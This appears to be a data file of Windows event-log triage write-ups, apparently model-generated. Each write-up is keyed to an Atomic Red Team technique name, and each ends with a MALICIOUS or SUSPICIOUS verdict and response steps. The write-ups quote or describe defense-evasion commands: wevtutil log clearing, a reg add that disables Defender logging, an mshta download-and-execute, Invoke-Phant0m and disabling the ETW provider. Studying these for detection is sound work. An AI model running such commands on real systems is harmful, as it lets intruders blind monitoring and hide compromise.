   - The logs show that the event logs (System, Security, and Windows PowerShell channels) have been cleared by the `admin_test` user. Clearing logs is a typical action performed by attackers to cover their tracks after performing malicious activities.

4. **Security Log:**
   - Event ID 1102 indicates that the security log has been cleared. Combined with the PowerShell activity, this suggests potential malicious activity since the clearing of logs is a suspicious action typically associated with hiding malicious actions.

5. **Application Log:**
   - Indicate normal security posture with Windows Defender reporting as active. However, Windows Defender might not have been triggered by the malicious activity.

**Assessment:**
Given the unusual use of PowerShell to execute compiled code, combined with suspicious file and process behavior, and the clearing of event logs, these activities stand out as indicative of potential malicious behavior.

**Resolution:**
- **MALICIOUS:** The combination of activities observed in the logs strongly suggests that the system may have been compromised. Immediate action is recommended to investigate the extent of the compromise, contain the threat, and prevent further unauthorized actions.

**Guidance on how to proceed:**
- Isolate the system from the network to prevent further malicious activities.
- Conduct a forensic investigation to determine the scope of the compromise.
- Review any unauthorized access or data exfiltration activities.
- Restore the system from a known good backup if available.
- Implement additional monitoring and security measures to prevent future incidents."
Event Viewer Registry Modification - Redirection Program,"### Detailed Analysis of Windows Event Logs

#### Summary
Upon reviewing the provided logs, there are several events that stand out and signify potential suspicious behavior:
1. **Event Log Clearing**: Several logs were cleared, including Security, System, and Windows PowerShell logs. This behavior is often associated with efforts to hide malicious activity or traces of an intrusion.
2. **Registry Modification via CMD**: There is a command executed via `cmd.exe` to add a registry entry related to the Event Viewer. Registry modifications, especially related to event logs or event viewers, could be suspect, particularly when performed by non-standard processes or users.
3. **Time Manipulation**: There are entries indicating adjustments to system time. Time manipulation can be part of tactics to cover tracks or misalign system activity logs.

#### Detailed Observations

1. **Event Log Clearing:**
   - **Event ID 1102 (Security):** ""LogFileCleared"" event found for multiple logs (Security log).
   - **Event ID 104 (System):** ""LogFileCleared"" event indicates that the System log was cleared.
   - This activity was performed by the user `SERVER002\admin_test` who had high integrity level access. Clearing logs is not a standard operation for normal administrative actions and indicates potential malicious activity.

2. **Registry Modification:**
   - **Process `cmd.exe` (Event ID 1, Sysmon Log):** Executing a command to add a new registry entry for MicrosoftRedirectionProgram for the Event Viewer (`notepad.exe`). This action seems unrelated to typical administrative tasks and could be used to mask redirections or modify system behavior.

3. **Time Manipulation:**
   - **Event ID 4616 (Security Logs):** Two events show a discrepancy indicating system time adjustments. This could be intended to defeat time-based log analyses or alerts.

4. **Processes and Privileges:**
   - High-level privileges were observed (seen in EventID 4672), which is typically okay for an admin user but combined with the other behavior (like clearing logs) increases suspicion.

### Assessment

The observed behaviors collectively contribute to a high suspicion of potential compromise:
- Log clearing activities aim to evade detection.
- Registry modifications without clear context or purpose often indicate an attempt to manipulate system operations.
- System time changes with no apparent justification could be an effort to manipulate log entries or timestamp validation.

### Final Resolution

**Resolution**: **MALICIOUS**

#### Guidance

1. **Immediate Actions:**
   - Conduct a full forensic analysis of `Server002` including a memory capture and a disk image.
   - Ensure the compromised user account `admin_test` is reviewed and access is controlled if the user is still valid.
   - Restore Event Log configurations and settings from a prior state if possible.

2. **Long-Term Actions:**
   - Implement monitoring solutions ensuring that all admin-level activities are audited and retained in multiple formats.
   - Educate the administration team about secure log management practices to prevent future unauthorized clearing.
   - Evaluate security tools to detect and respond to suspicious activities such as registry tampering and log evasion tactics."
UACME Bypass Method 34,"Upon analysis of the provided event logs, several key observations stand out as potentially suspicious and provide hints of malicious activity:

### Key Observations:

1. **Log File Clearing:**
   - System Event ID 104 appeared multiple times, indicating that the log files for System, Windows PowerShell, and Sysmon channels were cleared by the user `admin_test`. This is accompanied by a Security Event ID 1102, which confirms the clearing of the security log. Frequent or unexplained clearing of event logs is often indicative of someone trying to cover their tracks after a malicious activity.

2. **Suspicious Command Execution:**
   - Sysmon Event ID 1 shows the execution of `cmd.exe` with the command line that includes paths to directories indicative of penetration testing frameworks or known bypass tools (e.g., `AtomicRedTeam` and `uacme`). This type of execution, especially involving tools like `uacme`, is often associated with privilege escalation attempts.

3. **Process Creation by High-Integrity User:**
   - Multiple instances of `wevtutil.exe` (Sysmon Event ID 1) are used to clear specific event logs such as System, Application, Security, and PowerShell logs, all executed under a high-integrity process with privileges. This further supports the notion that the logs were intentionally cleared to hide specific activities.

4. **Unexpected Usage of Admin Account:**
   - The user `admin_test` is utilized in suspicious activities, including process creation and log clearing. The same account being used across these events, potentially from a service or automated task, should raise questions about unauthorized access or misuse of administrative accounts.

### Assessment:

The observed behavior encapsulates patterns typically linked to illicit activities:
- **Covering Tracks:** The clearing of logs immediately after certain processes is suspicious and suggests attempts to erase traces of execution.
- **Privilege Escalation Attempt:** Execution of known bypass tools raises concerns around attempts for privilege escalation.

### Resolution: **MALICIOUS**

The collected evidence strongly suggests malicious activity has occurred on the host. There are various indicators, including cleared logs and suspicious command executions (e.g., with tools related to adversarial tactics), that imply an intentional attempt to obfuscate unauthorized actions or exploitation.

### Recommendations:

1. **Immediate Isolation:** Isolate the affected system from the network to prevent further spread or data exfiltration.
  
2. **Credential Review:** Audit user account activities particularly `admin_test` and investigate any unauthorized changes or access.

3. **Forensic Analysis:** Perform deeper forensic analysis on the system to understand the extent of the breach and to identify all affected systems or data.

4. **Patch and Remediate:** Ensure all systems are patched for known vulnerabilities and review security controls to prevent similar future incidents.

5. **Log and Monitor:** Reinstate log monitoring with improved security tooling to capture and alert on similar unusual activities."
Execution of program.exe as service with unquoted service path,"**Analysis of the Logs:**

1. **Security Log:**
   - **Event ID 1102** indicates that the event log was cleared. This is a significant red flag, as attackers often clear logs to cover their tracks. The action was performed by user ""admin_test.""

2. **Sysmon Log:**
   - Multiple events showing the execution of `wevtutil.exe` with the command line to clear logs, this is suspicious. `wevtutil.exe` is a legitimate utility but can be used by attackers to clear logs as seen in:
     - CommandLine: `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
     - CommandLine: `""C:\\Windows\\system32\\wevtutil.exe"" cl System`
     - CommandLine: `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`
     - CommandLine: `""C:\\Windows\\system32\\wevtutil.exe"" cl ""Windows PowerShell""`
   - The event shows these actions were executed by the user ""admin_test"" with a high integrity level.
   - **Event ID 1** and **Event ID 5** indicate that these processes were spawned by `wsmprovhost.exe`, a legitimate Windows process related to Windows Remote Management, but these actions are suspicious.

3. **System Log:**
   - **Event ID 104** also indicates that the logs for System, Application, and Windows PowerShell were cleared by ""admin_test.""
   - **Service Control Manager Log**:
     - **Event ID 7045**: A new service ""Example Service"" was created with the binary path `C:\Program Files\windows_service.exe`. The creation of new services can be benign, but in this case, it could be associated with persistence mechanisms by an attacker.

4. **Sysmon Log Highlighting Suspicious Command Execution:**
   - A `cmd.exe` process executed a chain of commands using a temporary directory associated with the Atomic Red Team, a popular adversary emulation framework:
     - Copying an executable to system directories and creating a new service ""Example Service.""
     - This behavior suggests the use of a framework (e.g., Atomic Red Team) potentially for testing or malicious purposes.

**Assessment of the Situation:**
- The sequence of events, particularly the clearing of event logs by an administrative user, the creation of a new service using potentially suspicious binaries, and the use of a known adversary simulation framework, strongly indicate suspicious activities that may point to unauthorized activity or testing using malicious techniques.
- The use of admin-like permissions to cover tracks by clearing logs and creating services highlights elevated privileges typically associated with compromised systems.

**Resolution:**
- **MALICIOUS** - The activities observed are indicative of malicious behavior, including log manipulation and service creation, possibly used for privilege escalation or persistence. Immediate action is recommended, including isolating the system, conducting a full forensic investigation, and reviewing all admin accounts and access logs for unauthorized activities.

**Guidance on How to Proceed:**
1. **Isolate the Host:** Prevent further potential intrusions and lateral movement.
2. **Initiate a Threat Hunt:** Use threat intel feeds and signatures, particularly focusing on Atomic Red Team techniques.
3. **Conduct Forensic Analysis:** Extract disk and memory images to determine the nature and scope of the compromise.
4. **Review and Harden Security Postures:** Ensure logging configurations capture critical events, review administrative account security, and conduct a thorough review of all system accesses and modifications.
5. **User Awareness and Training:** Conduct training to ensure users are aware of potentially suspicious activities and reporting mechanisms."
Kill Event Log Service Threads,"Upon reviewing the provided Windows event logs, I have identified several instances of potentially suspicious and malicious activities:

### Indicators of Suspicious or Malicious Activity:

1. **Log Clearance Activity**:
   - The logs show multiple instances where the `admin_test` user cleared event logs from different channels (System, Windows PowerShell, and Security). Clearing logs is commonly employed by attackers to erase their traces.

2. **Time Manipulation**:
   - There are security event logs indicating time changes (`EventID: 4616`). Time-stamping events can be manipulated to confuse event sequence, another evasive tactic.

3. **Execution of Suspicious PowerShell Script**:
   - A PowerShell command was executed which set the Execution Policy to RemoteSigned and then downloaded and executed a script from an external source (`Invoke-Phant0m.ps1`). This script from GitHub is known to attempt event log hiding, which is considered malicious activity.

4. **Elevation of Privileges**:
   - The user `admin_test` obtained several high-level privileges (`EventID: 4672`). These included privileges like `SeDebugPrivilege`, typically unnecessary for routine tasks and could indicate privilege escalation attempts.

5. **Pattern of Logon Activities**:
   - There are multiple logon and logoff entries for the `admin_test` user from a foreign workstation (`DESKTOP-3HL5B2P`), which adds suspicion to unauthorized remote access attempts.

6. **Integrity Level**:
   - The suspicious processes were running with high integrity levels and executing administrative functions, pointing towards unauthorized administrative actions.

### Assessment:

The activities recorded in these logs exhibit multiple signs of compromise. These include log clearing, privilege escalation, time manipulation, and execution of potentially malicious software through PowerShell. Taken together, these activities are consistent with the behavior of an attacker attempting to establish persistence and cover tracks across the system.

### Resolution: MALICIOUS

**Immediate Actions:**
- Isolate the server (""Server002"") from the network to prevent further potential damage or data exfiltration.
- Begin a forensic analysis on `Server002` to understand the full scope of access and possible data compromise.
- Review user ""admin_test"" account activities and credentials for any unauthorized changes and consider rotating credentials.
- Investigate the source of the PowerShell script `Invoke-Phant0m.ps1` and ensure similar attack vectors are blocked.
- Reinforce and audit security policies and logging configurations to prevent such incidents in the future.

This analysis strongly suggests malicious activities were present, and action should be taken swiftly to mitigate further risks."
Msiexec.exe - Execute Local MSI file with an embedded DLL,"After thoroughly analyzing the provided log entries, here are the key findings:

1. **Process Execution and Command-Line Usage**:
   - There are multiple instances of `wevtutil.exe` with command-line arguments to clear various logs (e.g., Security, System, Application, and Windows PowerShell logs). This behavior is suspicious as log clearing is often used by attackers to cover their tracks.
   - The use of `powershell.exe` with non-standard command-line arguments (`-nop`) can be suspicious, especially if the purpose is not clear. Here it emits ""CustomAction export executed me; exit,"" suggesting a script execution that could be part of testing or malicious activity.
   - `cmd.exe` executing `msiexec.exe` with a path pointing to `AtomicRedTeam` (a known framework for simulations and demonstrations of attack techniques). This indicates an emulation activity, typically used in penetration testing or red team exercises.

2. **Log File Clearing Events**:
   - Security (EventID: 1102), System, Windows PowerShell, and possibly other logs seem to have been cleared by the user `SERVER002\admin_test`. Log clearance without a valid administrative change or operation is highly unusual and indicative of possibly malicious behavior.

3. **Privilege Escalation**:
   - The presence of EventID 4672 shows SYSTEM privileges are being used, but this is not uncommon; however, combined with log clearing, it could signify privilege misuse.

4. **Security Events**:
   - There are multiple credential-related EventIDs (e.g., 5379), though they primarily show failed attempts which could be either a legitimate malfunction or an indicative brute force or misconfiguration.

5. **Potential Testing/Simulation Activity**:
   - The presence of files and MSI from `AtomicRedTeam` suggests the possibility of a planned penetration test or simulation run by management or a security team. However, the use of the same account (`admin_test`) to clear logs should be verified for authenticity and permissions.

**Threat Assessment and Guidance**:
- **SUSPICIOUS**: Although there's significant evidence this may be part of a controlled red team exercise or penetration test, the clearing of logs and specific PowerShell usage are highly irregular activities under normal operations. The possibility of this being a controlled exercise does not eliminate the potential risks if not properly managed or if masqueraded as such by an attacker.

**Recommended Actions**:
- Confirm with management or security leads about any scheduled red team or penetration simulations on the system.
- Enhance monitoring on the account `admin_test`, specifically its use of admin privileges and system accesses.
- Implement strict access controls and auditing for log file access and ensure such actions are authorized.
- Conduct a review of other systems in the network for similar activities, as a lateral movement or wider network testing might be in progress or improperly contained."
Mshta Executes Remote HTML Application (HTA),"Upon analyzing the provided event logs, several indicators suggest the presence of potentially malicious activities. Here's the breakdown of the analysis:

1. **PowerShell Logs:**
   - The PowerShell logs indicate a suspicious use of a script that involves downloading a file using `Invoke-WebRequest` from a URL (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta`) and saving it to the Startup folder, executing it via `mshta`, and then attempting to terminate a process named ""calculator"".
   - Usage of `mshta` and storing scripts in the Startup directory is a known technique for persistence and execution. The script appears to be executing a Real-World Test from Red Canary's Atomic Red Team, indicating that this action could be a legitimate test or simulation. However, if not authorized, this mirrors tactics often used by malware.

2. **System and Security Logs:**
   - System logs show that the event logs were cleared (`EventID: 1102` for security, `104` for system and PowerShell channels). Clearing logs is commonly used by attackers to hide their tracks.
   - The user ""admin_test"" was associated with both clearing the logs and executing the suspicious PowerShell script, which raises a red flag about the credentials' integrity or insiders' activity.

3. **Sysmon Logs:**
   - There are events showing the execution of `mshta.exe`, `cmd.exe` followed by `calc.exe`, which corresponds to the actions expected from the PowerShell script.
   - Numerous command lines involving Microsoft Edge Update are seen but do not directly link to the identified malicious behavior. These could be regular updates or additional testing components.

4. **Application Logs:**
   - Logs merely indicate a routine service stop.

**Conclusion:**

The combination of PowerShell script execution involving downloading and executing a .hta file from an external source, coupled with the clearing of logs by the same user after these activities, is highly indicative of suspicious behavior which warrants further investigation. The context provided does not confirm if the actions were part of a legitimate security test or if they were unauthorized, potentially malicious actions.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Verify the authenticity and authorization of the PowerShell script and its payload with system administrators or security personnel.
- Conduct a thorough investigation into the user ""admin_test"" activities, check system integrity, and ensure credentials are not compromised.
- Monitor for further suspicious activities, particularly unauthorized log clearance or creation of new suspicious scripts in the system.
- Isolate the affected systems if unauthorized activities are confirmed to limit further compromise and propagation."
Windows - Modify file last access timestamp with PowerShell,"After conducting a detailed analysis of the log entries provided, several suspicious behaviors and potential indicators of malicious activity have been identified:

1. **Event Log Clearing**:
   - The system, security, and Windows PowerShell logs have been cleared by the user ""admin_test"" as indicated by the events with EventID 104 in the System log and EventID 1102 in the Security log. Clearing event logs is a common tactic used by attackers to cover their tracks.

2. **PowerShell Usage**:
   - There is a PowerShell command executed with the intention of modifying access times of files using a method indicative of the *Timestomp* technique, a known tactic often used by attackers to tamper with file timestamps. The script involved, named ""T1551.006_timestomp.txt,"" suggests it might be a simulation or an intentional red team test, but it warrants further investigation to determine its authenticity and intent.

3. **Use of `wevtutil.exe`**:
   - The use of `wevtutil.exe` with the `cl` (clear) command indicates the clearing of various event logs including System, Security, and Windows PowerShell. This matches the event clearing activities noted in the logs and further supports suspicious intent.

4. **Possibly Anomalous Process Execution**:
   - A series of system utilities (`HOSTNAME.EXE`, `whoami.exe`) were executed, which might be legitimate checks; however, in the context of other activities like log clearing and timestomping, it raises suspicion about user enumeration or system profiling for malicious purposes.

5. **Atomic Red Team Artifacts**:
   - References to the ""AtomicRedTeam"" directory and test file within the PowerShell command may indicate this was a security assessment using known attack techniques for testing detections. However, without confirmation, this could still represent a benign test or a malicious activity simulation.

**Assessment and Conclusion**:
- **Resolution**: **SUSPICIOUS**

The actions logged, such as event log clearing and timestomping, coupled with unusual command-line operations, suggest behavior consistent with malicious activities. Although there is evidence that might imply these are part of a testing or simulation exercise (e.g., use of ""AtomicRedTeam""), this has not been confirmed.

**Recommendation**: 
1. **Immediate Steps**:
   - Confirm with IT or security teams whether any red teaming or penetration testing was authorized on the date of these logs.
   - Perform further investigation into the actions of the user ""admin_test"" to determine legitimacy.
   - Check the integrity and origin of any scripts or tools found in the ""AtomicRedTeam"" directories.
   
2. **Mitigation**:
   - Implement stricter controls and monitoring on admin accounts to limit unnecessary log clearing and sensitive command execution.
   - Enhance log monitoring solutions to detect similar suspicious activities in real-time.

3. **Review and Educate**:
   - If this was indeed a legitimate test, review and improve communication and documentation processes to prevent such confusion in the future. Educate employees on recognizing and safely conducting testing activities."
Disable Windows Error Reporting Settings,"In the provided event logs, there are several indicators of potentially malicious activity:

1. **Event ID 1102 (Security Log):** The security event log was cleared, which is a well-known tactic used by attackers to cover their tracks. The user ""admin_test"" was responsible for this action.

2. **Event ID 104 (System Log):** The system and Windows PowerShell logs were cleared by the same user ""admin_test"". Log clearing of multiple channels in close succession is highly suspicious and often associated with malicious behavior.

3. **Event ID 4616 (Security Log):** The system time was altered. The time was set backwards, which can be used in conjunction with other actions to mislead log attribution.

4. **Event ID 4672 (Security Log):** The user ""admin_test"" was assigned special privileges, including SeDebugPrivilege, SeTakeOwnershipPrivilege, and others, which are sensitive privileges that can be misused for unauthorized actions.

5. **Suspicious Commands in Sysmon Log:**
   - Use of ""wevtutil.exe"" to clear the event logs.
   - Executing commands to alter registry settings for Windows Defender: disabling enhanced notifications. This might be an attempt to weaken the system's defenses.
   - Processes like ""cmd.exe"" and ""reg.exe"" running in the context of a high-level user making unauthorized registry changes are suspicious actions.

6. **Network Logon (Security Log):** There was an NTLM logon from a remote machine (DESKTOP-3HL5B2P) using the admin_test user, which is often seen in lateral movement techniques.

Overall, the patterns observed — including log clearing, privilege assignment, system time alterations, and registry modification — strongly suggest deliberate and potentially malicious activity conducted by or attributed to the user ""admin_test"". Given these observations:

**Resolution:** MALICIOUS

**Guidance:**
- Immediately investigate the user account ""admin_test"" for unauthorized access.
- Check for additional indicators of compromise (IOCs) on the host and related systems.
- Review network activity for connections from the referenced remote machine and other unusual outbound connections.
- Implement stringent monitoring on admin credentials and consider account isolation if tampering is suspected.
- Review and enhance logging and alerting around sensitive actions and privilege assignments."
Disable Powershell ETW Provider - Windows,"**Detailed Analysis of the Logs:**

1. **PowerShell Activity:**
   - Multiple PowerShell executions are logged with command-line arguments invoking a tool called PsExec (a Sysinternals tool) to execute commands interactively and with system privileges (`-i -s`). This behavior is typically used by administrators but can also be used by malicious actors to execute unauthorized commands with elevated privileges.
   - The use of PsExec to update logging/tracing configurations (`logman update trace ""EventLog-Application"" --p ""Microsoft-Windows-Powershell"" -ets`) can be indicative of an attempt to manipulate or obfuscate logging behavior, making it harder to track activities.

2. **Sysmon Log Activity:**
   - The logs indicate execution of processes like `wevtutil.exe` that are used to clear event logs (Security, System, Application), with high integrity level execution, which indicates a significant level of access.
   - PsExec is again observed running commands via `cmd.exe` and `PSEXESVC.exe` services, executing under NT AUTHORITY\SYSTEM, indicating privilege escalation.
   - Execution of `logman.exe` from PsExec suggests attempts to manipulate system performance logs, potentially to hide traces of activity.

3. **System and Security Log Manipulation:**
   - Event logs across Security, System, and PowerShell channels were cleared at approximately the same time, likely an attempt to erase activity evidence (`EventID=1102 for Security, EventID=104 for System` and `PowerShell`).
   - This action is generally considered highly suspicious, as clearing logs is typically not routine for benign operations.

4. **Service Entries:**
   - The presence of an entry for `PSEXESVC` (indicates PsExec service creation) under the Service Control Manager logs, often linked to using PsExec for potentially unauthorized tasks.

5. **Edge Updates and Benign Activities:**
   - Various entries for Microsoft Edge Update indicate routine update processes running under NT AUTHORITY\SYSTEM which are expected behavior for automatic updating.

**Assessment and Recommendations:**

- There are several indicators of potential compromise:
  - The use of PsExec for running commands with elevated privileges.
  - Clearing event logs to potentially cover tracks.
  - Attempts to manipulate logging configurations.

Regsvr32 local DLL execution,"### Detailed Analysis of Logs

**1. Security Log:**
- **EventID 1102**: This event indicates that the Security log was cleared. The user associated with this action is `admin_test`, which is a clear red flag since clearing log files is often attempted by attackers trying to remove traces of their actions.

**2. Application Log:**
- The entries related to Windows Defender (`SECURITY_PRODUCT_STATE_ON`) and Edge Update stopping services do not inherently indicate malicious behavior without additional context. The state of Windows Defender being on suggests that the system's primary security feature was functioning. 
- Edge Update stopping could be a routine process update, although the timing around other unusual events is worth noting.

**3. Sysmon Log:**
- **EventID 1 & EventID 5 for `wevtutil.exe`**: Multiple events show the execution of `wevtutil.exe` with the command to clear various event logs, including `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` logs. This is directly associated with EventID 1102 in the Security log and is suspicious.
- **Processes ID 7036 (cmd.exe with regsvr32.exe)**: This command line includes paths related to Atomic Red Team, which is a known open-source project providing simulated adversary simulations for testing detection capabilities. The usage of `regsvr32.exe` to execute a potentially malicious DLL is also a known attack technique.
  
**4. System Log:**
- **EventID 104**: Multiple log files being cleared by the same user (`admin_test`) shortly before or after other key events were generated. This pattern indicates a deliberate attempt to hide activities on the system. This correlates with Sysmon logs that showed `wevtutil.exe` commands.

### Assessment

The activities, especially clearing multiple system logs using `wevtutil.exe`, along with command execution of potentially malicious scripts or DLL files using `regsvr32.exe` are strong indicators of unauthorized and potentially malicious actions. The correlation of these activities performed by the `admin_test` account on `Server002` aligns with adversarial tactics aimed at compromising system integrity and avoiding detection.

### Resolution

**Resolution: MALICIOUS**

**Identified Threats/Risks:**
- Clearing of security and event logs suggests activity meant to evade detection.
- Execution of known attack techniques, specifically using `regsvr32.exe` with non-standard DLLs.
- Execution of `wevtutil.exe` to clear logs under admin privileges, indicative of privilege misuse or compromise.

### Recommendations on How to Proceed
1. **Immediate Incident Response:**
   - Isolate `Server002` from the network to prevent further spread or external communication.
   - Begin a comprehensive forensic investigation on `Server002` to determine the full extent of the compromise.
   - Change all administrative passwords and audit account privileges to limit potential further unauthorized access.

2. **Long-Term Security Measures:**
   - Implement stricter monitoring and alerting on event log clearing activities.
   - Limit the use of powerful utilities such as `wevtutil.exe` to only necessary system processes and restrict usage to specific administrators under monitored sessions.
   - Regularly audit and verify the integrity of security mechanisms (e.g., Windows Defender) to ensure they are operating as expected. 

3. **User Training and Awareness:**
   - Provide training to system administrators regarding the importance of logging and the signs of potential system misuse.

Taking these actions can help mitigate current threats and bolster defenses against future incidents."
SIP (Subject Interface Package) Hijacking via Custom DLL,"Upon analyzing the provided Windows event logs from various sources, the following observations and analysis can be made:

1. **Log Cleared Activity**:
    - Multiple event logs show activities where logs have been cleared. For instance, the logs from the System channel cleared by the user ""admin_test"" (Event ID 104). Clearing logs can be a significant indication of malicious activity, especially when done by a user without proper justification.

2. **Suspicious PowerShell Activity**:
    - There are PowerShell executions noted, such as `powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1'` and another script examining Windows Installer files. While PowerShell is commonly used for legitimate administration tasks, its prevalence in various attacks makes it crucial to scrutinize these events further.

3. **Usage of `regsvr32`**:
    - The Sysmon log entries indicate the use of `regsvr32.exe` to register a DLL located under a directory associated with Atomic Red Team (a well-known red team exercise). While this can be benign if used by security teams for testing, it can also indicate a simulation of legitimate attacks or a breach.

4. **Software and System Updates**:
    - There are numerous updates being logged, particularly related to Microsoft Edge updates, Windows Update Client actions and tasks related to telemetry and other standard Windows maintenance services. These activities seem regular as part of system maintenance.

5. **Service and Process Execution**:
    - Several processes related to the Microsoft Edge Update service and other system processes like `svchost.exe`, `taskhostw.exe`, and `wermgr.exe` are documented. While these processes are standard for Windows hosts, their association with log clearance and PowerShell invocations requires careful examination.

6. **Security and Privilege Audit**:
    - Security audit logs show privilege assignments to the SYSTEM account with SeDebugPrivilege, among others. This can potentially allow a process to perform more extensive actions on the system, making it critical to verify the intent and legitimacy of these privileges being granted.

### Assessment:
- **Suspicious**: The combination of cleared event logs, the use of PowerShell scripts, and the registration of a DLL using `regsvr32`, alongside the presence of red team-related file names could indicate testing or potentially malicious activity. The log clearing, especially, is concerning and typically associated with attempts to cover tracks.
  
### Guidance on Further Steps:
- Conduct a thorough investigation of the user ""admin_test"" who performed log clearance activities. Understand their role, and check any justifications or logs for these actions.
- Review the PowerShell scripts and commands executed to ensure they align with legitimate administrative tasks.
- If the Atomic Red Team exercises are indeed authorized, verify engagements and ensure they are covered by a legitimate exercise plan.
- Ensure logging and auditing are re-enabled and that there are alerts set up for unusual log-clearing activities going forward.
- If unauthorized or unexplained activities are discovered, escalate the investigation, considering containment and eradication steps if a breach is confirmed.

Final Resolution: **SUSPICIOUS** - The logs contain activities that do not appear entirely benign and warrant further in-depth investigation."
Modify RDP-Tcp Initial Program Registry Entry,"After a thorough analysis of the provided Windows event logs, the following key observations and assessments have been made regarding suspicious or anomalous activities:

### Key Observations:
1. **Event Log Clearing**:
   - Multiple instances of event log clearing (`EventID: 104` in the System log and `EventID: 1102` in the Security log) were performed by the user `admin_test`. The logs were cleared for System, Windows PowerShell, and Security channels around the same time.

2. **Privilege Use**:
   - A specific security event (`EventID: 4672`) indicates that the user `admin_test` received a special privilege, including `SeDebugPrivilege`, `SeSecurityPrivilege`, and others. This level of privilege is often associated with system-level access and can be suspicious if not justified by the user's role.

3. **Unusual Command Execution**:
   - An instance of the `cmd.exe` process executing a registry modification command that affects Terminal Services (`EventID: 1` in Sysmon log). Such a change can potentially be used to manipulate remote desktop settings or similar services.

4. **Use of Event Utility (wevtutil.exe)**:
   - There are multiple executions of `wevtutil.exe` corresponding with the clearing of event logs. This tool is used to manage event logs and can be part of routine maintenance but is also often used in attacks to cover tracks.

### Assessment:
Given these observations, several activities stand out as potentially suspicious:
- **Clearing of Event Logs**: The deliberate clearing of logs without proper documentation or justification is a red flag, suggesting attempts to cover tracks.
- **High Privileges Used**: The acquisition and use of elevated privileges by `admin_test` could suggest lateral movement or preparation for privilege escalation.
- **Registry Modifications**: Executing commands to modify registry settings related to Terminal Services without campaign or maintenance documentation could be indicative of malicious intent or unauthorized configuration changes.

### Conclusion:
Based on the suspicious behavior identified, particularly the clearing of logs, high privilege usage without context, and registry modifications, the provided logs indicate suspicious activity that merits further investigation. 

### Resolution: SUSPICIOUS

### Guidance:
1. **Immediate Investigation**: Conduct a thorough investigation of the `admin_test` account. Verify the intent and authorization for clearing logs and privilege elevations.
2. **Log Integrity Check**: Obtain backup copies of logs prior to the clearing event for detailed analysis.
3. **Audit Account Usage**: Investigate other activities associated with `admin_test` and other privileged users on the system.
4. **Enhance Monitoring**: Implement additional auditing and monitoring measures for future detection of similar activities.
5. **Validate Changes**: Confirm whether the alterations made to Terminal Services were authorized and compliant with security policies."
LockBit Black - Disable the ETW Provider of Windows Defender -cmd,"Upon reviewing the provided logs, I have identified several indicators of potentially suspicious activity:

1. **Event Log Clearing**:
   - The `event ID 1102` in the Security log and `event ID 104` in the System log both indicate that multiple event logs (Security, System, Application, and Windows PowerShell) were cleared. The clearing of event logs is a commonly used technique to cover tracks by attackers, as it removes evidence of their activity. The user ""admin_test"" was responsible for clearing the logs, which may indicate either a case of user error or malicious activity if unauthorized.

2. **Wevtutil Execution**:
   - Wevtutil.exe was used multiple times within a very short time frame to clear logs (Sysmon events indicate this activity). The command-line arguments for `wevtutil.exe cl` indicate log-clearing operations. This sequence of actions is indicative of attempts to hide these actions, commonly associated with post-exploitation or lateral movement phases in attack scenarios.

3. **Suspicious Registry Modification**:
   - A command was executed to modify the registry using `cmd.exe` and `reg.exe` to change the settings of Windows Defender logs (`reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /t REG_DWORD /d 0 /f`). Disabling or altering logging features is often associated with attempts to avoid detection by disabling or tampering with security mechanisms.

4. **Execution of Whoami.exe and Hostname.exe**:
   - Although `whoami.exe` and `hostname.exe` are legitimate Windows utilities used to gather information about the current user and system, their execution immediately following the clearing of logs adds context suggesting they may have been used by an attacker to gather recon information.

5. **Execution Context**:
   - Most activities, including process executions and registry modifications, were performed under the context of `SERVER002\admin_test` with high integrity level, indicating administrative privileges were utilized, possibly misused if unauthorized.

**Assessment:**
The combination of cleared event logs, registry modifications to disable Windows Defender logging, execution of reconnaissance commands (whoami, hostname), and the context of administrative privilege usage all point to activity that aligns with common tactics used by attackers to cover their tracks and maintain stealth.

**Resolution: SUSPICIOUS**

Given these findings, the scenario should be classified as **SUSPICIOUS**. Immediate steps should include:

- **Review User Activity**: Investigate the account `admin_test` to verify if the actions were legitimate and authorized.
- **Preserve and Analyze Logs**: Safeguard any remaining logs and conduct a further detailed forensic analysis on the host to identify any unknown suspicious or rogue processes and changes.
- **Audit Permissions**: Audit permissions and verify if any unauthorized access or privileges were granted.
- **Enhanced Monitoring**: Increase monitoring on the host for any unusual activity or further attempts to modify or clear logs.
- **Update and Scan Systems**: Ensure all systems are updated, and conduct thorough malware scans to check for signs of compromise."
Add domain to Trusted sites Zone,"After a thorough analysis of the provided logs, several activities indicate the potential for malicious activity or at least warrant further investigation:

1. **Security Log Clearing (Event ID 1102) and System Log Clearing (Event ID 104):**
   - The security log shows that the logs were cleared by a user named ""admin_test"" at `2024-10-24 14:29:07.5370231`. Similarly, the system logs related to both System and Windows PowerShell channels were cleared almost simultaneously. Log clearing is a classic sign of an attempt to cover tracks after performing suspicious activities.

2. **Suspicious PowerShell Activity:**
   - There are multiple entries in the Windows PowerShell log with Event ID 600, which show the execution of a script modifying the registry. The script sets policies for a domain named ""bad-domain.com,"" which is highly suspicious. Modifying the Windows Internet Settings ZoneMap to classify the domain as trusted or modifying its properties can be part of a malicious operation to facilitate network operations with that domain, potentially bypassing standard security measures.

3. **Sysmon Logs Indicating Anomalous Process Execution:**
   - Numerous Sysmon events correlate with the PowerShell activity described above. Specifically:
     - Event ID 1 logs show the execution of suspicious PowerShell commands that match the registry changes depicted in the PowerShell logs. 
     - The processes were executed under 'admin_test' and involved high integrity level operations, potentially indicating use of administrative privileges.

In conclusion, the combination of suspicious PowerShell script execution modifying vital registry keys, log clearing activities, and executed commands indicative of privilege misuse present strong indicators of compromise or at least malicious intent.

**Resolution:** 
- **MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Isolation:** Isolate the host from the network to prevent further potentially malicious activities or data exfiltration.
2. **Detailed Investigation:** Conduct a deeper forensic investigation to examine other possible compromised vectors and further assess the extent of the breach. Specifically, understanding what other processes 'admin_test' executed in recent days may offer further insight.
3. **Incident Response:** Engage your Incident Response team to follow through with containment, eradication, and recovery.
4. **User Accounts Audit:** Review all actions taken by 'admin_test' as well as the credentials associated with this account to determine if they have been compromised.
